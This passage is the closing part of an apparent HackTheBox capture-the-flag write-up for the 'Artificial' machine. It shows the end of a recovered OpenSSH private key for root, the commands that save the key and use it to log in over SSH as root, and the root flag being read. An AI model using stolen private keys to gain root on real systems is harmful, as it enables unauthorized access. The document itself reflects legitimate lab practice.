06zniaTP9+nNojunwob+Uzz+Mvx/R1h6+F77DlhpGaRVAMS2eMBAmh116oX8MYtgZI5/gs
00l898E0SzO8tNErgp2DvzWJ4uE5BvunEKhoXTL6BOs0uNLZYjOmEpf1sbiEj+5fx/KXDu
S918igW2vtohiy4//6mtfZ3Yx5cbJALViCB+d6iG1zoe1kXLqdISR8Myu81IoPUnYhn6JF
yJDmfzfQRweboqV0dYibYXfSGeUdWqq1S3Ea6ws2SkmjYZPq4X9cIYj47OuyQ8LpRVAAAA
wDbejp5aOd699/Rjw4KvDOkoFcwZybnkBMggr5FbyKtZiGe7l9TdOvFU7LpIB5L1I+bZQR
6E0/5UW4UWPEu5Wlf3rbEbloqBuSBuVwlT3bnlfFu8rzPJKXSAHxUTGU1r+LJDEiyOeg8e
09RsVL31LGX714SIEfIk/faa+nwP/kTHOjKdH0HCWGdECfKBz0H8aLHrRK2ALVFr2QA/GO
At7A4TZ3W3RNhWhDowiyDQFv4aFGTC30Su7akTtKqQEz/aOQAAAMEA/EkpTykaiCy6CCjY
WjyLvi6/OFJoQz3giX8vqD940ZgC1B7GRFyEr3UDacijnyGegdq9n6t73U3x2s3AvPtJR+
LBeCNCKmOILeFbH19o2Eg0B32ZDwRyIx8tnxWIQfCyuUSG9gEJ6h2Awyhjb6P0UnnPuSoq
O9r6L+eFbQ60LJtsEMWkctDzNzrtNQHmRAwVEgUc0FlNNknM/+NDsLFiqG4wBiKDvgev0E
UzM9+Ujyio6EqW6D+TTwvyD2EgPVVDAAAAwQDpN/02+mnvwp1C78k/T/SHY8zlQZ6BeIyJ
h1U0fDs2Fy8izyCm4vCglRhVc4fDjUXhBEKAdzEj8dX5ltNndrHzB7q9xHhAx73c+xgS9n
FbhusxvMKNaQihxXqzXP4eQ+gkmpcK3Ta6jE+73DwMw6xWkRZWXKW+9tVB6UEt7n6yq84C
bo2vWr51jtZCC9MbtaGfo0SKrzF+bD+1L/2JcSjtsI59D1KNiKKTKTNRfPiwU5DXVb3AYU
l8bhOOImho4VsAAAAPcm9vdEBhcnRpZmljaWFsAQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

We `saved` the `key` to a `file`, `set` the required `permissions` and used it to login as `root` to grab the `root.txt`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Artificial/files]
└─$ chmod 600 root_id_rsa
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Artificial/files]
└─$ ssh -i root_id_rsa root@artificial.htb
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon 23 Jun 2025 09:24:04 AM UTC

  System load:           0.02
  Usage of /:            58.8% of 7.53GB
  Memory usage:          35%
  Swap usage:            0%
  Processes:             243
  Users logged in:       1
  IPv4 address for eth0: 10.129.34.5
  IPv6 address for eth0: dead:beef::250:56ff:fe94:5266


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Jun 23 09:24:05 2025 from 10.10.16.9
root@artificial:~#
```

## root.txt

```shell
root@artificial:~# cat root.txt 
ca4afc4c65a3bf7c6177c3606e4ebb54
```